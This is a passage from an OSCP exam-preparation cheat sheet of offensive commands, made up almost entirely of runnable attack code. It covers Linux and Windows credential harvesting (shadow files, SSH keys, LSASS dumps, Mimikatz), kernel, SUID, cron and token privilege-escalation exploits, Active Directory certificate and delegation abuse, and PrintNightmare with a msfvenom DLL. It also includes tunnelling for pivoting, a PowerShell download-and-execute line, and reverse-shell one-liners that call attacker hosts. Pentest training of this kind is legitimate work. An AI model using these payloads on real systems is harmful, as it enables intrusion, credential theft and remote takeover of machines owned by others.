 
python3 -m uploadserver 80  
 
```
 
---  
 
## Useful Commands and One-Liners

```text
  These apps are now globally available
    - CheckLDAPStatus.py
    - DumpNTLMInfo.py
    - Get-GPPPassword.py
    - GetADComputers.py
    - GetADUsers.py
    - GetLAPSPassword.py
    - GetNPUsers.py
    - GetUserSPNs.py
    - addcomputer.py
    - atexec.py
    - attrib.py
    - badsuccessor.py
    - changepasswd.py
    - dacledit.py
    - dcomexec.py
    - describeTicket.py
    - dpapi.py
    - esentutl.py
    - exchanger.py
    - filetime.py
    - findDelegation.py
    - getArch.py
    - getPac.py
    - getST.py
    - getTGT.py
    - goldenPac.py
    - karmaSMB.py
    - keylistattack.py
    - kintercept.py
    - lookupsid.py
    - machine_role.py
    - mimikatz.py
    - mqtt_check.py
    - mssqlclient.py
    - mssqlinstance.py
    - net.py
    - netview.py
    - ntfs-read.py
    - ntlmrelayx.py
    - owneredit.py
    - ping.py
    - ping6.py
    - psexec.py
    - raiseChild.py
    - rbcd.py
    - rdp_check.py
    - reg.py
    - registry-read.py
    - regsecrets.py
    - rpcdump.py
    - rpcmap.py
    - sambaPipe.py
    - samedit.py
    - samrdump.py
    - secretsdump.py
    - services.py
    - smbclient.py
    - smbexec.py
    - smbserver.py
    - sniff.py
    - sniffer.py
    - split.py
    - ticketConverter.py
    - ticketer.py
    - tstool.py
    - wmiexec.py
    - wmipersist.py
    - wmiquery.py

```
 
### Linux  
 
```bash
 
# Locate files  
 
find / -name "*.txt" 2>/dev/null  
 
locate filename  
 
which binary  
 
whereis binary  
 
# Find writable directories  
 
find / -type d -writable 2>/dev/null  
 
# Find SUID files  
 
find / -perm -4000 2>/dev/null  
 
# List all users  
 
cat /etc/passwd | cut -d: -f1  
 
# Check sudo rights  
 
sudo -l  
 
# Monitor processes  
 
watch -n 1 'ps aux'  
 
# Network connections  
 
netstat -antup  
 
ss -tulpn  
 
# Running services  
 
systemctl list-units --type=service --state=running  
 
# Cron jobs  
 
cat /etc/crontab  
 
ls -la /etc/cron.*  
 
# Disk usage  
 
df -h  
 
du -sh *  
 
# Compress/decompress  
 
tar -czvf archive.tar.gz folder/  
 
tar -xzvf archive.tar.gz  
 
zip -r archive.zip folder/  
 
unzip archive.zip  
 
# Base64 encode/decode  
 
echo "text" | base64  
 
echo "dGV4dAo=" | base64 -d  
 
# URL encode  
 
echo "text" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read().strip()))"  
 
```
 
### Windows  
 
```cmd
 
:: List directory contents  
 
dir /a  
 
dir /s /b  
 
:: Find files  
 
dir /s *pass* 2>nul  
 
findstr /si password *.txt *.xml *.ini  
findstr /si "password" *.php *.xml *.config *.ini
 
:: System info  
 
systeminfo  
 
hostname  
 
whoami /all  
 
:: Network info  
 
ipconfig /all  
 
netstat -ano  
 
arp -a  
 
route print  
 
:: Users and groups  
 
net user  
 
net localgroup  
 
net localgroup administrators  
 
:: Services  
 
sc query  
 
sc qc <service_name>  
 
wmic service get name,pathname,startmode  
 
:: Scheduled tasks  
 
schtasks /query /fo LIST /v  
 
:: Running processes  
 
tasklist /v  
 
wmic process list full  
 
:: Firewall  
 
netsh firewall show state  
 
netsh advfirewall show allprofiles  
 
:: Check permissions  
 
icacls file.txt  
 
accesschk.exe -uwcqv "Everyone" *  
 
```
 
### PowerShell  
 
```powershell
 
# Download and execute  
 
IEX(New-Object Net.WebClient).DownloadString('[http://10.10.14.x/script.ps1](http://10.10.14.x/script.ps1)')  
 
# Base64 encode command  
 
$command = 'whoami'  
 
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))  
 
# Execute base64 encoded command  
 
powershell -enc <base64_string>  
 
# Bypass execution policy  
 
powershell -ep bypass  
 
Set-ExecutionPolicy Bypass -Scope Process  
 
# Search for files  
 
Get-ChildItem -Path C:\ -Include *.txt -Recurse -ErrorAction SilentlyContinue  
 
# Search file contents  
 
Select-String -Path C:\*.txt -Pattern "password"  
 
Get-ChildItem -Recurse | Select-String "password"  
 
# List processes  
 
Get-Process  
 
# Network connections  
 
Get-NetTCPConnection -State Listen  
 
```
 
---

## Post-Exploitation: Linux Deep-Dive

### Credential Harvesting (Linux)

```bash
# Shadow file (if readable or after root)
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa

# History files
cat /home/*/.bash_history
cat /root/.bash_history
cat /home/*/.mysql_history
cat /home/*/.psql_history

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null | head -30
grep -rli "password\|passwd\|pass\|secret\|key\|token\|api" /etc/ /opt/ /var/www/ /home/ 2>/dev/null

# Web config files
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php        # Joomla
cat /var/www/html/sites/default/settings.php  # Drupal
cat /var/www/html/.env                     # Laravel/Node
cat /var/www/html/config/database.yml      # Rails
cat /opt/*/config/*.yml 2>/dev/null

# Database credentials
cat /etc/mysql/my.cnf
cat /etc/mysql/debian.cnf  # Debian/Ubuntu MySQL root password
cat /etc/postgresql/*/main/pg_hba.conf

# Stored credentials in memory
strings /proc/*/maps 2>/dev/null | grep -i "password"

# Keyring / GNOME
find / -name "*.keyring" -o -name "*.keystore" 2>/dev/null

# Ansible vault / playbooks
find / -name "*.yml" -o -name "*.yaml" 2>/dev/null | xargs grep -l "ansible_password\|vault_pass" 2>/dev/null
```

### Linux Kernel Exploits (Expanded)

```bash
# Check kernel
uname -r && cat /proc/version

# Major kernel exploits by version range
# DirtyCow (CVE-2016-5195) - Linux < 4.8.3
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# DirtyPipe (CVE-2022-0847) - Linux 5.8 <= x < 5.16.11
# Overwrites read-only files
./exploit /etc/passwd 1 "${hacker_line}"

# PwnKit (CVE-2021-4034) - polkit pkexec, nearly all Linux distros
./PwnKit  # Instant root, no kernel compile needed

# GameOver(lay) (CVE-2023-2640 / CVE-2023-32629) - Ubuntu kernels
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p]*/teleport l/;
setcap cap_setuid+eip l/mount;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m;
touch m/*; u/teleport"

# Use linux-exploit-suggester
./linux-exploit-suggester.sh
# Or
./les.sh --uname "$(uname -r)"
```

### Linux Capabilities (Expanded)

```bash
getcap -r / 2>/dev/null

# cap_setuid+ep - escalate to root
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search - read any file
./tar -cvf shadow.tar /etc/shadow && tar -xvf shadow.tar

# cap_dac_override - write any file
# Modify /etc/passwd or /etc/shadow

# cap_net_bind_service - bind to privileged ports
# Useful for setting up rogue services on 80/443

# cap_sys_ptrace - trace/debug processes
# Can inject into running processes or read memory

# cap_fowner - change ownership of any file
# Change ownership of /etc/shadow, then read it

# cap_sys_admin - mount filesystems, many kernel operations
# Often equivalent to root
```

### Linux SUID Exploitation (Expanded)

```bash
# Find SUID
find / -perm -4000 -type f 2>/dev/null

# Custom SUID binary analysis
strings /path/to/suid_binary  # Look for relative paths
ltrace /path/to/suid_binary   # Library calls
strace /path/to/suid_binary   # System calls

# SUID binaries calling relative commands (PATH injection)
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/vulnerable_suid_binary

# Shared object injection
strace /path/to/suid 2>&1 | grep "No such file"
# If it loads from a writable path, create malicious .so:
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /path/to/missing.so /tmp/exploit.c

# Common SUID GTFOBins:
# base64, bash -p, cp, find -exec, nmap --interactive, python, vim, env
# Always check: https://gtfobins.github.io/
```

### Cron Jobs (Expanded)

```bash
# Enumerate
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# Monitor with pspy (no root needed)
./pspy64  # Or pspy32 for 32-bit

# Writable cron script
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/writable_cron_script.sh

# Wildcard injection (tar)
# If cron runs: tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh

# Wildcard injection (rsync)
# If cron runs: rsync -a * /backup/
echo "" > "-e sh shell.sh"

# Relative path in crontab
# If PATH in crontab is: PATH=/home/user:/usr/local/sbin:...
# And cron runs: backup.sh (without full path)
# Create /home/user/backup.sh with reverse shell

# Writable PATH directory
# If cron calls a binary and a directory in PATH is writable
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /writable/path/binary
chmod +x /writable/path/binary
```

### Docker / LXD Privilege Escalation

```bash
# If user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# If user is in lxd group
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/bash
# Root filesystem at /mnt/root

# Mounted docker socket
find / -name "docker.sock" 2>/dev/null
# If /var/run/docker.sock is accessible
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash
```

---

## Post-Exploitation: Windows Deep-Dive

### Token Impersonation (Expanded)

```cmd
:: Check current privileges
whoami /priv

:: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
:: These are common on IIS/MSSQL service accounts

:: PrintSpoofer (Windows 10 / Server 2016-2019)
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe ATTACKER 4444 -e cmd.exe"

:: GodPotato (Windows 8-11 / Server 2012-2022) - MOST RELIABLE
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Users\Public\nc.exe ATTACKER 4444 -e cmd.exe"

:: JuicyPotato (Server 2008-2016, not 2019+)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\Users\Public\nc.exe ATTACKER 4444 -e cmd.exe" -t *

:: SweetPotato (covers JuicyPotato + PrintSpoofer)
SweetPotato.exe -e EfsRpc -p C:\Users\Public\nc.exe -a "ATTACKER 4444 -e cmd.exe"

:: RoguePotato (Windows 10 1809+)
:: Requires attacker-controlled machine on port 135
:: Attacker: socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999
RoguePotato.exe -r ATTACKER -e "cmd.exe /c C:\Users\Public\nc.exe ATTACKER 4444 -e cmd.exe" -l 9999

:: SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "ATTACKER 4444 -e cmd.exe"
```

### ADCS Privilege Escalation (Expanded)

```bash
# ESC1 - Misconfigured certificate template allowing user-specified SAN
certipy find -u user@domain -p pass -dc-ip DC_IP
certipy req -u user@domain -p pass -ca CA-NAME -template VulnTemplate \
    -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# ESC4 - User has write access to certificate template
certipy template -u user@domain -p pass -template VulnTemplate \
    -save-old
# Modify template to be ESC1-vulnerable, then exploit as ESC1

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
# Same as ESC1 exploitation

# ESC7 - User has Manage CA or Manage Certificates permission
certipy ca -ca CA-NAME -add-officer user -u user@domain -p pass
certipy ca -ca CA-NAME -enable-template SubCA -u user@domain -p pass
certipy req -u user@domain -p pass -ca CA-NAME -template SubCA \
    -upn administrator@domain
# If denied, issue manually:
certipy ca -ca CA-NAME -issue-request REQUEST_ID -u user@domain -p pass
certipy req -u user@domain -p pass -ca CA-NAME -retrieve REQUEST_ID

# ESC8 - Web Enrollment + NTLM Relay
# Start relay listener
certipy relay -target http://CA_IP
# Or: ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController
# Trigger coercion (PetitPotam, PrinterBug)
petitpotam.py ATTACKER_IP DC_IP

# After getting certificate, authenticate
certipy auth -pfx dc.pfx -dc-ip DC_IP
# Then DCSync with obtained NT hash
impacket-secretsdump domain/dc\$@DC_IP -hashes :HASH
```

### PrintSpooler / PrintNightmare

```bash
# Check if spooler is running
nxc smb TARGET -u user -p pass -M spooler
# Or from Windows: sc query spooler

# PrintNightmare (CVE-2021-1675 / CVE-2021-34527) - Remote RCE
# Requires: Print Spooler running, SMB share accessible

# Host malicious DLL on SMB share
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll
impacket-smbserver share . -smb2support

# Exploit
python3 CVE-2021-1675.py domain/user:pass@TARGET '\\ATTACKER\share\evil.dll'

# Local Privilege Escalation variant
# Upload DLL to target, then:
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -DLL "C:\Users\Public\evil.dll" -DriverName "PrinterUpdate"
```

### Group Policy Preferences (GPP) Passwords

```bash
# GPP passwords stored in SYSVOL - encrypted with known AES key

# From Linux
impacket-Get-GPPPassword domain/user:pass@DC_IP

# Or manually
smbclient //DC_IP/SYSVOL -U user%pass
# Navigate to: domain/Policies/*/Machine/Preferences/Groups/Groups.xml
# Look for cpassword attribute

# Decrypt GPP password
gpp-decrypt "ENCRYPTED_STRING"

# From Windows
findstr /S /I cpassword \\DC\sysvol\domain\policies\*.xml

# Metasploit
use auxiliary/scanner/smb/smb_enum_gpp
```

### Windows Credential Locations

```cmd
:: SAM + SYSTEM (local accounts)
reg save HKLM\SAM C:\Users\Public\sam
reg save HKLM\SYSTEM C:\Users\Public\system
:: Extract: impacket-secretsdump -sam sam -system system LOCAL

:: LSASS memory dump
:: Method 1: Task Manager (if GUI)
:: Method 2: procdump
procdump.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
:: Method 3: comsvcs.dll (built-in, no tools needed)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
:: Method 4: nanodump
nanodump.exe --write C:\Users\Public\lsass.dmp

:: Parse dump
mimikatz> sekurlsa::minidump lsass.dmp
mimikatz> sekurlsa::logonpasswords

:: From Linux with pypykatz
pypykatz lsa minidump lsass.dmp

:: DPAPI - Decrypt saved browser passwords, RDP credentials
mimikatz> dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*
mimikatz> dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\* /rpc

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NETWORK" key=clear

:: Registry stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s  :: PuTTY saved sessions
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities

:: Credential Manager
cmdkey /list
:: Use saved creds
runas /savecred /user:administrator cmd.exe

:: IIS config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

:: Unattend files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\unattend.xml
```

### Mimikatz Full Reference

```cmd
:: Elevate
mimikatz> privilege::debug
mimikatz> token::elevate

:: Dump all logon passwords
mimikatz> sekurlsa::logonpasswords

:: Dump SAM
mimikatz> lsadump::sam

:: DCSync (need Replicating Directory Changes)
mimikatz> lsadump::dcsync /domain:domain.htb /user:administrator
mimikatz> lsadump::dcsync /domain:domain.htb /user:krbtgt

:: Golden Ticket
mimikatz> kerberos::golden /domain:domain.htb /sid:S-1-5-21-xxx /krbtgt:HASH /user:administrator /ptt

:: Silver Ticket
mimikatz> kerberos::golden /domain:domain.htb /sid:S-1-5-21-xxx /rc4:SERVICE_HASH /user:administrator /service:CIFS /target:dc.domain.htb /ptt

:: Pass the Hash
mimikatz> sekurlsa::pth /user:administrator /domain:domain.htb /ntlm:HASH

:: Pass the Ticket
mimikatz> kerberos::ptt ticket.kirbi

:: Skeleton Key (backdoor all accounts with password "mimikatz")
mimikatz> misc::skeleton

:: Extract Kerberos tickets
mimikatz> sekurlsa::tickets /export

:: DPAPI
mimikatz> dpapi::cache

:: pypykatz equivalent (from Linux)
pypykatz lsa minidump lsass.dmp
```

### RBCD (Resource-Based Constrained Delegation)

```bash
# If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity on target
# Step 1: Create computer account (or use one you control)
impacket-addcomputer domain/user:pass -computer-name FAKE01\$ -computer-pass Passw0rd -dc-ip DC_IP

# Step 2: Set RBCD
impacket-rbcd domain/user:pass -delegate-from FAKE01\$ -delegate-to TARGET\$ -dc-ip DC_IP -action write

# Step 3: Get service ticket
impacket-getST domain/FAKE01\$:Passw0rd -spn cifs/TARGET.domain -impersonate administrator -dc-ip DC_IP

# Step 4: Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec domain/administrator@TARGET -k -no-pass
```

### Shadow Credentials

```bash
# If you can write to msDS-KeyCredentialLink
# Using certipy
certipy shadow auto -u user@domain -p pass -account TARGET\$

# Using pywhisker
python3 pywhisker.py -d domain -u user -p pass --target TARGET\$ --action add --dc-ip DC_IP
# Then use PKINIT to authenticate
python3 gettgtpkinit.py domain/TARGET\$ -cert-pfx output.pfx -dc-ip DC_IP TARGET.ccache
```

---

## Pivoting and Tunneling (Expanded)

### Chisel (Expanded)

```bash
# === Reverse SOCKS Proxy (most common) ===
# Attacker
chisel server -p 8080 --reverse

# Target
./chisel client ATTACKER:8080 R:socks
# Proxychains: socks5 127.0.0.1 1080

# === Forward SOCKS (target is server) ===
# Target
./chisel server -p 8080 --socks5

# Attacker
chisel client TARGET:8080 socks
# Proxychains: socks5 127.0.0.1 1080

# === Port Forward (specific port) ===
# Attacker
chisel server -p 8080 --reverse

# Target (forward RDP from internal host)
./chisel client ATTACKER:8080 R:3389:INTERNAL_HOST:3389
# Now: xfreerdp /v:127.0.0.1 /u:user /p:pass

# === Multiple forwards ===
./chisel client ATTACKER:8080 R:8888:10.10.10.5:80 R:9999:10.10.10.5:445

# === Windows ===
chisel.exe client ATTACKER:8080 R:socks
```

### Ligolo-ng (Expanded)

```bash
# === Setup (Attacker) ===
# Create TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# === Target ===
./agent -connect ATTACKER:11601 -ignore-cert

# === In Ligolo-ng Console ===
# List sessions
session

# Select session
session 1  # or use arrow keys

# View target network interfaces
ifconfig

# Add route for target's internal network
sudo ip route add 10.10.10.0/24 dev ligolo

# Start tunnel
start

# === Double Pivot (Target1 -> Target2 -> Internal) ===
# On Target1:
./agent -connect ATTACKER:11601 -ignore-cert

# Add route for Target2's subnet
sudo ip route add 172.16.0.0/24 dev ligolo

# Add listener on Target1 to catch Target2's agent
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# On Target2:
./agent -connect TARGET1:11602 -ignore-cert

# Add route for Target2's internal subnet
sudo ip route add 192.168.100.0/24 dev ligolo

# === Port forwarding (expose attacker port on target) ===
# Useful for reverse shells from internal hosts
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

### SSH Tunneling (Expanded)

```bash
# === Local Port Forward ===
# Access remote_host:remote_port via localhost:local_port
ssh -L local_port:remote_host:remote_port user@ssh_server
# Example: access internal web server
ssh -L 8080:10.10.10.5:80 user@pivot_host
# Browser -> http://localhost:8080

# === Remote Port Forward ===
# Expose attacker service to target's network
ssh -R target_port:localhost:local_port user@ssh_server
# Example: expose attacker's port 4444 on target
ssh -R 4444:127.0.0.1:4444 user@target

# === Dynamic SOCKS Proxy ===
ssh -D 9050 user@pivot_host
# proxychains.conf: socks5 127.0.0.1 9050
proxychains nmap -sT -Pn 10.10.10.0/24

# === SSH through multiple hops ===
ssh -J user1@host1,user2@host2 user3@final_host

# === Persistent tunnel with autossh ===
autossh -M 0 -f -N -D 9050 user@pivot_host

# === SSH without shell (just tunnel) ===
ssh -N -f -L 8080:internal:80 user@pivot

# === Useful flags ===
# -N = no shell, just tunnel
# -f = background
# -g = allow remote hosts to connect to forwarded ports
# -o StrictHostKeyChecking=no = skip host key check
```

### Proxychains Configuration

```bash
# /etc/proxychains4.conf
# For single proxy:
# socks5 127.0.0.1 1080

# For chain through multiple:
# strict_chain
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# Usage
proxychains nmap -sT -Pn -p 80,445,3389 10.10.10.5
proxychains evil-winrm -i 10.10.10.5 -u admin -p pass
proxychains impacket-psexec domain/admin:pass@10.10.10.5
proxychains xfreerdp /u:admin /p:pass /v:10.10.10.5
proxychains curl http://10.10.10.5

# Note: proxychains only works with TCP. No ICMP, no UDP.
# Use -sT (connect scan) with nmap, not -sS (SYN scan)
```

### Windows Pivoting Tools

```cmd
:: netsh port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

:: plink (PuTTY command-line)
plink.exe -L 8080:127.0.0.1:80 user@ATTACKER
plink.exe -D 9050 user@ATTACKER  :: Dynamic SOCKS
plink.exe -R 4444:127.0.0.1:4444 user@ATTACKER  :: Remote forward

:: Chisel (Windows)
chisel.exe client ATTACKER:8080 R:socks
```

---

## Looting Reference

### Where to Find Credentials

```
=== Linux ===
/etc/shadow                    # Password hashes
/home/*/.ssh/id_rsa           # SSH private keys
/home/*/.bash_history         # Command history (may contain passwords)
/home/*/.mysql_history        # MySQL command history
/var/www/html/wp-config.php   # WordPress DB creds
/var/www/html/.env            # Application env vars
/opt/*/config/*               # Application configs
/etc/mysql/debian.cnf         # MySQL root password (Debian)
/var/lib/mysql/mysql/user.MYD # MySQL user table
/root/.bash_history           # Root command history
Cron job scripts              # May contain hardcoded creds
/etc/exports                  # NFS config (no_root_squash)

=== Windows ===
SAM + SYSTEM registry hives   # Local account hashes
LSASS memory                  # Plaintext/hashed credentials
NTDS.dit + SYSTEM             # All domain account hashes
C:\Users\*\AppData\Local\Microsoft\Credentials\*  # Saved creds
C:\inetpub\wwwroot\web.config    # IIS connection strings
C:\Windows\Panther\Unattend.xml  # Install passwords
SYSVOL\*\Groups.xml              # GPP passwords (pre-2014)
C:\ProgramData\McAfee\Common Framework\SiteList.xml  # AV creds
Registry autologon                # Cleartext passwords
Browser saved passwords (DPAPI)   # Chrome, Firefox, Edge
KeePass databases (.kdbx)        # Master password needed
```

### pypykatz (Linux alternative to mimikatz)

```bash
# Parse LSASS dump
pypykatz lsa minidump lsass.dmp

# Parse registry hives
pypykatz registry --sam sam --system system

# Parse NTDS.dit
pypykatz ntds --ntds ntds.dit --system system

# Live parsing (if running on target with impacket)
impacket-secretsdump domain/admin:pass@TARGET
impacket-secretsdump -sam sam -system system LOCAL
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### Post-Exploitation Checklist

```
After Initial Access:
[ ] Stabilize shell (PTY upgrade / evil-winrm / RDP)
[ ] whoami /all (Windows) or id (Linux)
[ ] Check for quick wins: sudo -l, SeImpersonate, SUID
[ ] Grab flags/proof files
[ ] Screenshot proof

After Privilege Escalation:
[ ] Dump credentials (SAM/LSASS/shadow)
[ ] Check for stored credentials (cmdkey, ssh keys, history)
[ ] Look for other network interfaces (pivot opportunities)
[ ] Check for domain membership
[ ] Grab all config files with credentials
[ ] Check for other hosts in ARP table / routing table

After Domain Admin:
[ ] DCSync all hashes
[ ] Dump NTDS.dit
[ ] Check for trust relationships
[ ] Enumerate other forests/domains
[ ] Check for additional machines to pivot to
```

---

## Exam Strategy and Tips
 
### Time Management  
 
- **Hours 0-1**: Initial scanning of all machines  
 
- **Hours 1-4**: Work on low-hanging fruit  
 
- **Hours 4-12**: Focus on harder machines  
 
- **Hours 12-18**: Complete remaining machines  
 
- **Hours 18-24**: Documentation and verification  
 
### Enumeration Priority  
 
1. Run comprehensive nmap scans on all machines  
 
2. Check for low-hanging fruit (default creds, known CVEs)  
 
3. Web applications - directory bruteforce, manual testing  
 
4. Service-specific enumeration  
 
### Common Pitfalls to Avoid  
 
- Not scanning all ports  
 
- Missing obvious hints in files/commenßts  
 
- Not trying default credentials  
 
- Overthinking - OSCP exploits are known vulnerabilities  
 
- Not taking screenshots during exploitation  
 
### Documentation  
 
- Screenshot every step  
 
- Keep detailed notes of commands used  
 
- Document all credentials found  
 
- Record the exploitation path  
 
### Exam Point Distribution  
 
- 3 standalone machines (20 points each) = 60 points  
 
- Active Directory set (40 points) = 40 points  
 
- **Passing score: 70 points**  
 
### Tools to Have Ready  
 
```bash
 
# Ensure these are working before exam  
 
- nmap  
 
- gobuster/feroxbuster  
 
- nikto  
 
- searchsploit  
 
- msfvenom  
 
- chisel  
 
- linpeas/winpeas  
 
- pspy  
 
- bloodhound  
 
- crackmapexec  
 
- impacket tools  
 
```
 
### Pre-Exam Checklist  
 
- [ ] VPN connection working  
 
- [ ] Screenshot tools ready  
 
- [ ] Note-taking setup  
 
- [ ] Backup internet connection  
 
- [ ] Food and drinks prepared  
 
- [ ] Break schedule planned  
 
- [ ] Wordlists downloaded  
 
- [ ] Tools tested and ready  
 
---  
 
## Quick Reference  
 
### Reverse Shell Cheat Sheet  
 
```bash
 
# Bash  
 
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1  
 
# Netcat  
 
nc -e /bin/bash 10.10.14.x 4444  
 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.x 4444 >/tmp/f  
 
# Python  
 
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'  
 
# PowerShell  
 
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.x',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($t);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()"  
 
```
 
### Hash Types (Hashcat)  
 
```
 
0 - MD5  
 
100 - SHA1  
 
500 - md5crypt  
 
1000 - NTLM  
 
1800 - sha512crypt  
 
3200 - bcrypt  
 
5600 - NetNTLMv2  
 
13100 - Kerberos TGS-REP  
 
18200 - Kerberos AS-REP  
 
```
 
### Common Default Credentials  
 
```
 
admin:admin  
 
admin:password  
 
root:root  
 
root:toor  
 
administrator:password  
 
guest:guest  
 
tomcat:tomcat  
 
manager:manager  
 
```
 
---  
 
*Good luck with your OSCP examination!*
